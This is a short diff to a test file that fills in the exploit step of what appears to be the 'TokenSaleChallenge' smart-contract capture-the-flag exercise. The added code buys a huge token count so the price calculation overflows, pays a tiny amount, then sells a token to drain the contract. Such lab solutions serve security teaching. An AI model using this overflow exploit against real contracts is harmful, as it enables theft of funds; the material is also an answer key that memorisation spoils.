@@ -24,9 +24,13 @@ describe('TokenSaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const buyTx = await target.buy("115792089237316195423570985008687907853269984665640564039458", {
+      value: "415992086870360064",
+    });
+    await buyTx.wait();
+
+    const tx = await target.sell(1);
+    await tx.wait();
 
     expect(await target.isComplete()).to.equal(true);
   });
